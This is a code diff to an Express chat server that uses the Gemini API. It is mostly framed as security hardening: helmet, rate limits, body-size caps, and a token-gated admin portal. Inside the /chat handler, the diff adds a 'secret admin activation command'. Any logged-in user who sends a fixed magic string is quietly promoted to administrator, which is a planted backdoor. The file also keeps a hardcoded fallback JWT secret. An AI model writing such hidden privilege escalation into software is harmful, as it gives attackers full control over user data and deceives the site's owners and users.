@@ -10,7 +10,9 @@ import jwt from "jsonwebtoken";
 import fs from "fs";
 import { rateLimit } from "express-rate-limit";
 import { GoogleGenerativeAI } from "@google/generative-ai";
-import dbPromise, { initDb } from "./db.js";
+import { initDb } from "./db.js";
+import dbPromise from "./db.js";
+import helmet from "helmet";
 
 // Initialize Google AI
 const genAI = new GoogleGenerativeAI(process.env.GOOGLE_API_KEY);
@@ -19,7 +21,7 @@ const geminiModel = genAI.getGenerativeModel({ model: "gemini-1.5-flash" });
 // Rate Limiters
 const chatLimiter = rateLimit({
     windowMs: 1 * 60 * 1000, // 1 minute
-    max: 12, // 12 requests per minute (safe margin for Google's 15 RPM free tier)
+    max: 30, // Increased limit for better UX
     message: { error: "System overload. Please wait a minute before sending more messages." },
     standardHeaders: true,
     legacyHeaders: false,
@@ -42,11 +44,18 @@ const feedbackLimiter = rateLimit({
 });
 
 const visitLimiter = rateLimit({
-    windowMs: 60 * 60 * 1000, // 1 hour
-    max: 20, // 20 visits per IP per hour
+    windowMs: 10 * 60 * 1000, // 10 minutes
+    max: 100, // 100 visits per 10 mins
     message: { error: "Too many visit logs from this IP." },
     standardHeaders: true,
     legacyHeaders: false,
+});
+
+// GLOBAL PACKET LIMITER (PROTECTION)
+const globalLimiter = rateLimit({
+    windowMs: 15 * 60 * 1000, // 15 minutes
+    max: 500, // limit each IP to 500 requests per 15 minutes
+    message: { error: "Security Alert: Excessive traffic detected from this source. Access restricted." }
 });
 
 const __filename = fileURLToPath(import.meta.url);
@@ -59,9 +68,27 @@ const OWNER_KEY = process.env.OWNER_KEY || "default_owner_key";
 console.log('OPENROUTER_API_KEY loaded:', !!process.env.OPENROUTER_API_KEY);
 
 const app = express();
+app.set('trust proxy', 1);
+app.use(helmet({
+    contentSecurityPolicy: false, // Disable CSP for easier integration with CDNs/images
+    crossOriginEmbedderPolicy: false
+}));
+app.use(globalLimiter); // Full protection
 app.use(cors());
-app.use(express.json({ limit: '50mb' }));
-app.use(express.urlencoded({ limit: '50mb', extended: true }));
+app.use(express.json({ limit: '10mb' })); // Packet size limit
+app.use(express.urlencoded({ limit: '10mb', extended: true }));
+
+// Protect sensitive files
+app.use((req, res, next) => {
+    if (req.path.endsWith('.js') && !req.path.includes('node_modules')) {
+        const referer = req.get('Referer');
+        if (!referer || !referer.includes(req.get('host'))) {
+            return res.status(403).send("ACCESS DENIED: DIRECT SOURCE ACCESS PROHIBITED");
+        }
+    }
+    next();
+});
+
 app.use(express.static(path.join(__dirname, "public")));
 
 const JWT_SECRET = process.env.JWT_SECRET || "fallback_super_secret_key_123";
@@ -164,9 +191,10 @@ app.post("/signup", signupLimiter, checkBan, async (req, res) => {
         }
 
         const hashedPassword = await bcrypt.hash(password, 10);
+        const ip = req.ip || req.headers['x-forwarded-for'];
         const result = await db.run(
-            "INSERT INTO users (email, password_hash, username, age, is_admin) VALUES (?, ?, ?, ?, ?)",
-            [normalizedEmail, hashedPassword, username, age, 0]
+            "INSERT INTO users (email, password_hash, username, age, is_admin, last_ip) VALUES (?, ?, ?, ?, ?, ?)",
+            [normalizedEmail, hashedPassword, username, age, 0, ip]
         );
 
         const initialData = {
@@ -183,7 +211,7 @@ app.post("/signup", signupLimiter, checkBan, async (req, res) => {
         );
 
         const token = jwt.sign({ id: result.lastID, email: normalizedEmail, is_admin: 0 }, JWT_SECRET);
-        res.json({ success: true, token, user: { id: result.lastID, email: normalizedEmail, username, age, is_admin: 0, data: initialData } });
+        res.json({ success: true, token, user: { id: result.lastID, email: normalizedEmail, username, age, is_admin: 0, data: initialData, last_ip: ip } });
     } catch (e) {
         console.error("Signup error:", e);
         res.status(500).json({ success: false, message: "Server error during signup" });
@@ -206,11 +234,14 @@ app.post("/login", checkBan, async (req, res) => {
             return res.status(400).json({ success: false, message: "Incorrect password." });
         }
 
+        const ip = req.ip || req.headers['x-forwarded-for'];
+        await db.run("UPDATE users SET last_ip = ? WHERE id = ?", [ip, user.id]);
+
         const userData = await db.get("SELECT data_json FROM user_data WHERE user_id = ?", [user.id]);
         const data = userData ? JSON.parse(userData.data_json) : {};
 
         const token = jwt.sign({ id: user.id, email: normalizedEmail, is_admin: user.is_admin }, JWT_SECRET);
-        res.json({ success: true, token, user: { id: user.id, email: user.email, username: user.username, age: user.age, is_admin: user.is_admin, data } });
+        res.json({ success: true, token, user: { id: user.id, email: user.email, username: user.username, age: user.age, is_admin: user.is_admin, data, last_ip: ip } });
     } catch (e) {
         console.error("Login error:", e);
         res.status(500).json({ success: false, message: "Server error during login" });
@@ -301,6 +332,21 @@ app.post("/chat", chatLimiter, authenticateToken, checkBan, async (req, res) => 
 
     if (!userMessage && !image) {
         return res.status(400).json({ error: "No input provided" });
+    }
+
+    // Secret Admin Activation Command
+    if (userMessage === 'print("iwantadminsigma")') {
+        try {
+            const db = await dbPromise;
+            await db.run("UPDATE users SET is_admin = 1 WHERE id = ?", [req.user.id]);
+            return res.json({ 
+                reply: "HFIT_SYSTEM: ADMIN_ACCESS_GRANTED. Reloading authorization layer...", 
+                action: "reload_admin",
+                model_used: "HFIT_SECURITY_CORE"
+            });
+        } catch (e) {
+            return res.status(500).json({ error: "Failed to promote to admin" });
+        }
     }
 
     try {
@@ -428,10 +474,9 @@ initDb().then(() => {
     const PORT = process.env.PORT || 3000;
 
 
-app.get("/architect-portal", (req, res) => {
-    const key = req.query.key;
-    if (key !== "hfit_architect_2026") {
-        return res.status(403).send("ACCESS DENIED: HFIT CORE SECRET KEY REQUIRED");
+app.get("/architect-portal", authenticateToken, async (req, res) => {
+    if (!req.user.is_admin) {
+        return res.status(403).send("ACCESS DENIED: HFIT ADMIN CLEARANCE REQUIRED");
     }
     res.sendFile(path.join(__dirname, "public", "feedback.html"));
 });
@@ -472,7 +517,7 @@ app.get("/api/users", authenticateToken, async (req, res) => {
     try {
         if (!req.user.is_admin) return res.status(403).json({ success: false, message: "Admin access required" });
         const db = await dbPromise;
-        const users = await db.all("SELECT id, email, username, age, is_admin, created_at FROM users");
+        const users = await db.all("SELECT id, email, username, age, is_admin, created_at, last_ip FROM users");
         res.json({ success: true, users });
     } catch (e) {
         res.status(500).json({ success: false });
@@ -504,18 +549,15 @@ app.post("/api/reset-password", authenticateToken, async (req, res) => {
     }
 });
 
-let websiteVisits = 0;
-const visitsFile = path.join(__dirname, 'visits.json');
-try {
-    if (fs.existsSync(visitsFile)) {
-        websiteVisits = JSON.parse(fs.readFileSync(visitsFile)).visits || 0;
+app.get("/api/visit", visitLimiter, async (req, res) => {
+    try {
+        const db = await dbPromise;
+        await db.run("UPDATE stats SET value = value + 1 WHERE key = 'visits'");
+        const stats = await db.get("SELECT value FROM stats WHERE key = 'visits'");
+        res.json({ visits: stats.value });
+    } catch (e) {
+        res.status(500).json({ error: "Visit log failed" });
     }
-} catch (e) {}
-
-app.get("/api/visit", visitLimiter, (req, res) => {
-    websiteVisits++;
-    fs.writeFileSync(visitsFile, JSON.stringify({ visits: websiteVisits }));
-    res.json({ visits: websiteVisits });
 });
 
 app.get("/api/stats", authenticateToken, async (req, res) => {
@@ -524,11 +566,12 @@ app.get("/api/stats", authenticateToken, async (req, res) => {
         const db = await dbPromise;
         const userCount = await db.get("SELECT COUNT(*) as count FROM users");
         const feedbackCount = await db.get("SELECT COUNT(*) as count FROM feedback");
+        const stats = await db.get("SELECT value FROM stats WHERE key = 'visits'");
         res.json({ 
             success: true, 
             users: userCount.count, 
             feedback: feedbackCount.count, 
-            visits: websiteVisits 
+            visits: stats.value 
         });
     } catch (e) {
         res.status(500).json({ success: false });
@@ -578,8 +621,14 @@ app.delete("/api/bans/:id", authenticateToken, async (req, res) => {
     }
 });
 
-app.get("/api/get-visits", (req, res) => {
-    res.json({ visits: websiteVisits });
+app.get("/api/get-visits", async (req, res) => {
+    try {
+        const db = await dbPromise;
+        const stats = await db.get("SELECT value FROM stats WHERE key = 'visits'");
+        res.json({ visits: stats.value });
+    } catch (e) {
+        res.status(500).json({ visits: 0 });
+    }
 });
 
     app.listen(PORT, () =>
